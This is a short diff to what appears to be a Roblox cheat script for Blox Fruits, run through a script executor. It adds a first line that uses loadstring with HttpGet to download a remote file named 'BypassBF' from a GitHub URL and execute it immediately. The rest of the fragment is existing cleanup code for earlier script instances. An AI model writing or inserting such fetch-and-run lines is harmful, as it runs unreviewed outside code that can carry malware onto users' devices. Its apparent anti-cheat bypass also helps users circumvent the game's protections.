@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aslamdunk7/paypmboygang/refs/heads/main/BypassBF"))()
+
 -- Re-entrancy Cleanup: terminate previous execution threads
 if getgenv().PayomboyZ_BloxFruits_Cleanup then
     pcall(getgenv().PayomboyZ_BloxFruits_Cleanup)
